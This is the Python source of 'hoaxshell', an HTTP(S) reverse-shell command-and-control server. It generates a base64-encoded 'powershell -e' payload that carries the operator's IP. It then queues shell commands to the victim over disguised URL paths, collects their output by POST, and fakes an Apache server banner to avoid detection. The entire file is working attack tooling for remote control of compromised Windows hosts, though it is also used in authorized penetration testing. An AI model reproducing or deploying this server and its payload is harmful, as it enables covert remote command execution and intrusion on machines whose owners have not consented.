#!/bin/python3
# 
# Written by Panagiotis Chartas (t3l3machus)
# https://github.com/t3l3machus

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, sys, argparse, base64, os, readline, uuid
from warnings import filterwarnings
from datetime import date, datetime
from IPython.display import display
from threading import Thread, Event
from time import sleep

filterwarnings("ignore", category = DeprecationWarning) 

# Generate self-signed certificate (bash):
# openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;46m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'

# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser()

parser.add_argument("-s", "--server-ip", action="store", help = "Your Hoaxshell server ip address", required = True)
parser.add_argument("-c", "--certfile", action="store", help = "Your certificate.")
parser.add_argument("-k", "--keyfile", action="store", help = "The private key for your certificate. ")
parser.add_argument("-p", "--port", action="store", help = "Your Hoaxshell server port (default: 443)", type = int) 
parser.add_argument("-f", "--frequency", action="store", help = "Change html elements poisoning cycle frequency (default: 1s)", type=float)
parser.add_argument("-r", "--raw-payload", action="store_true", help = "Print payload raw instead of base64 encoded")
parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (Default: false)")
parser.add_argument("-v", "--verbose", action="store_true", help = "Verbose output (prepare for long stdout)")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup")

args = parser.parse_args()

# ~ if args.url:
	# ~ try:
		# ~ Hoaxshell_server_url = args.url
		
		# ~ if re.search("http://", Hoaxshell_server_url):
			# ~ exit(f'\n[{FAILED}] - {BOLD}Hoaxshell requires https to run. The attack will most likely fail otherwise.{END}\n')
		
		# ~ tmp = Hoaxshell_server_url.split('/')
		# ~ Hoaxshell_server_url = '/'.join(tmp[:3])
		
		# ~ if not validate_url(Hoaxshell_server_url):
			# ~ exit(f'\n[{FAILED}] - {BOLD}Invalid server base url.{END}\n')
		
	# ~ except IndexError:
		# ~ parser.print_usage()
		# ~ sys.exit(1)

ssl_support = True if args.certfile and args.keyfile else False

# -------------- General Functions -------------- #                                           
def print_banner():
	txt_color = 46
	padding = '  '
	l = f'\033[38;5;{txt_color}m'
	e = '\033[38;5;255m'
	 
	banner = [
		f'{padding}   {e}██{l}╗{e}  ██{l}╗{e} ██████{l}╗{e}  █████{l}╗{e} ██{l}╗{e}  ██{l}╗{e}███████{l}╗{e}██{l}╗{e}  ██{l}╗{e}███████{l}╗{e}██{l}╗{e}     ██{l}╗{e}',
		f'{padding}   ██{l}║{e}  ██{l}║{e}██{l}╔═══{e}██{l}╗{e}██{l}╔══{e}██{l}╗╚{e}██{l}╗{e}██{l}╔╝{e}██{l}╔════╝{e}██{l}║{e}  ██{l}║{e}██{l}╔════╝{e}██{l}║{e}     ██{l}║{e}',
		f'{padding}   ███████{l}║{e}██{l}║{e}   ██{l}║{e}███████{l}║ ╚{e}███{l}╔╝ {e}███████{l}╗{e}███████{l}║{e}█████{l}╗{e}  ██{l}║{e}     ██{l}║{e}',
		f'{padding}   ██{l}╔══{e}██{l}║{e}██{l}║{e}   ██{l}║{e}██{l}╔══{e}██{l}║{e} ██{l}╔{e}██{l}╗ ╚════{e}██{l}║{e}██{l}╔══{e}██{l}║{e}██{l}╔══╝{e}  ██{l}║{e}     ██{l}║{e}',
		f'{padding}   ██{l}║  {e}██{l}║╚{e}██████{l}╔╝{e}██{l}║{e}  ██{l}║{e}██{l}╔╝{e} ██{l}╗{e}███████{l}║{e}██{l}║{e}  ██{l}║{e}███████{l}╗{e}███████{l}╗{e}███████{l}╗{e}',
		f'{padding}   {l}╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝{END}'
	]

	
	print('\r')
	
	for line in banner:
		l = f'\033[38;5;{txt_color}m'
		print(f'{line}')
		txt_color += 1

	print(f'{padding}\t\t\t\t\t\t         Created by t3l3machus\n')



def encodePayload(payload):
	enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
	print(f'{PLOAD}{enc_payload}{END}')



def is_valid_uuid(value):
	
    try:
        uuid.UUID(str(value))
        return True
        
    except ValueError:
        return False




def checkPulse(stop_event):
		
	while not stop_event.is_set():
		
		timestamp = int(datetime.now().timestamp())
		
		if Hoaxshell.execution_verified:
			if abs(Hoaxshell.last_received - timestamp) > 15:
				print(f'\r[{WARN}] Session has been idle for more than 15 seconds. Shell probably died.')
				stop_event.set()
		
		sleep(5)
		


def chill():
	pass


# -------------- Basic Settings -------------- #
prompt = "hoaxshell > "
verbose = True if args.verbose else False
quiet = True if args.quiet else False
frequency = str(args.frequency) if args.frequency else '1000'
stop_event = Event()


def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):
	
	if Hoaxshell.rst_promt_required or force_rst:
		sys.stdout.write(prefix + prompt + readline.get_line_buffer())
		Hoaxshell.rst_promt_required = False	


# -------------- Hoaxshell Server -------------- #
class Hoaxshell(BaseHTTPRequestHandler):
	
	restored = False
	rst_promt_required = False
	prompt_ready = True
	command_pool = []
	execution_verified = False
	last_received = ''
	SESSIONID = str(uuid.uuid4())
	
		
	def do_GET(self):

		timestamp = int(datetime.now().timestamp())
		Hoaxshell.last_received = timestamp

		if args.grab and not Hoaxshell.restored:			
			session_id = self.headers.get('X-hoax-id')
			if is_valid_uuid(session_id):
				Hoaxshell.SESSIONID = session_id
				Hoaxshell.restored = True
				Hoaxshell.execution_verified = True
				session_check = Thread(target = checkPulse, args = (stop_event,))
				session_check.daemon = True
				session_check.start()				
				
			print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
			rst_promt_required = True
				
		self.server_version = "Apache/2.4.1"
		self.sys_version = ""
		session_id = self.headers.get('X-hoax-id')
		legit = True if session_id == Hoaxshell.SESSIONID else False

		# Verify execution
		if self.path == f'/4db6390f840c' and legit:
			
			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()			
			self.wfile.write(bytes('OK', "utf-8"))
			Hoaxshell.execution_verified = True
			session_check = Thread(target = checkPulse, args = (stop_event,))
			session_check.daemon = True
			session_check.start()	
			print(f'\r[{GREEN}Shell{END}] {BOLD}Execution verified!{END}')
			rst_promt_required = True


		# Grab cmd
		if self.path == f'/c5233a465a7d' and legit and Hoaxshell.execution_verified:
						
			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			
			if len(Hoaxshell.command_pool):
				cmd = Hoaxshell.command_pool.pop(0)									
				self.wfile.write(bytes(cmd, "utf-8"))
			
			else:
				self.wfile.write(bytes('None', "utf-8"))
					
			Hoaxshell.last_received = timestamp
			rst_promt_required = False
												
		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass				
			
		rst_prompt()

		
		
	def do_POST(self):
		global prompt
		timestamp = int(datetime.now().timestamp())
		Hoaxshell.last_received = timestamp		
		self.server_version = "Apache/2.4.1"
		self.sys_version = ""
		session_id = self.headers.get('X-hoax-id')
		legit = True if session_id == Hoaxshell.SESSIONID else False				
					
		# cmd results
		if self.path == '/7f47fd7ae404' and legit and Hoaxshell.execution_verified:

			self.send_response(200)
			self.send_header('Access-Control-Allow-Origin', '*')
			self.send_header('Content-Type', 'text/plain')
			self.end_headers()
			self.wfile.write(b'OK')
			script = self.headers.get('X-form-script')
			content_len = int(self.headers.get('Content-Length'))
			results = self.rfile.read(content_len)
			
			try:
				results = results.decode('utf-8', 'ignore') 
				
			except UnicodeDecodeError:
				print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
			
			print(f'\r{GREEN}{results}{END}') if results not in [None, ''] else print(f'\r{ORANGE}No output.{END}')
			
			Hoaxshell.prompt_ready = True
	
		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass				
			
		

	def do_OPTIONS(self):
		
		self.server_version = "Apache/2.4.1"
		self.sys_version = ""		
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', 'X-hoax-id')
		self.end_headers()
		self.wfile.write(b'OK')
			
			
	def log_message(self, format, *args):
		return


def main():
	
	try:
		global verbose
		if ssl_support:
			server_port = int(args.port) if args.port else 443
		else:
			server_port = int(args.port) if args.port else 8080
		
		try:
			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)
			
		except OSError:	
			exit(f'\n[{FAILED}] - {BOLD}Port {server_port} seems to already be in use.{END}\n')

		if ssl_support:
			httpd.socket = ssl.wrap_socket (
				httpd.socket, 
				keyfile = args.keyfile , 
				certfile = args.certfile , 
				server_side = True, 
				ssl_version=ssl.PROTOCOL_TLS
			)
		

		chill() if quiet else print_banner()
		port = f':{server_port}' if server_port != 443 else ''
						
		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
		Hoaxshell_server.daemon = True
		Hoaxshell_server.start()
	
		
		# Prepare payload
		if not args.grab:
			print(f'[{INFO}] {BOLD}Generating payload...{END}\n')
			source = open(f'./https_payload.ps1', 'r') if  ssl_support else open(f'./http_payload.ps1', 'r')
			payload = source.read()
			source.close()
			freq = args.frequency if args.frequency else 1
			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(freq))	
			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')

			print(f'[{INFO}] {BOLD}Type "help" to get a list of the available prompt commands.{END}')
			print(f'[{INFO}] {BOLD}Https Server started on port {server_port}.{END}') if ssl_support else print(f'[{INFO}] {BOLD}Http Server started on port {server_port}.{END}')
			print(f'[{INFO}] {BOLD}Awaiting payload execution to initiate shell session...{END}')
			
		else:
			print(f'\r[{IMPORTANT}] Attempting to restore session. Listening for hoaxshell traffic...')
					
				
		# Command prompt
		while True:
			
			if Hoaxshell.prompt_ready:
				user_input = input(prompt).strip()
				# ~ user_input = input(prompt).strip().split(' ')
				# ~ cmd_list = [w for w in user_input if w]
				# ~ cmd = cmd_list[0].lower() if cmd_list else ''
				
				if user_input.lower() == 'help':
					print(
					'''
					\r  Command                    Description
					\r  -------                    -----------
					\r  help                       Print this message.
					\r  payload                    Print payload again (base64). 
					\r  rawpayload                 Print payload again (raw).                  
					\r  clear/cls                  Clear screen.
					\r  exit/quit/q                Terminate program.
					''')

				elif user_input.lower() in ['clear', 'cls']:
					os.system('clear')
				
				elif user_input.lower() in ['payload']:
					encodePayload(payload)

				elif user_input.lower() in ['rawpayload']:
					print(f'{PLOAD}{payload}{END}')
					
				elif user_input.lower() in ['exit', 'quit', 'q']:
					stop_event.set()
					sys.exit(0)			
				
				elif user_input == '':
					rst_prompt(force_rst = True, prompt = '\r')
							
				else:
					
					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
						Hoaxshell.command_pool.append(user_input)
						Hoaxshell.prompt_ready = False

					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
						pass
						
					else:
						print(f'\r[{INFO}] No active session.')
	
			
	except KeyboardInterrupt:
		print(f'\n[{WARN}] Session terminated.')
		stop_event.set()
		sys.exit(0)


if __name__ == '__main__':
	main()
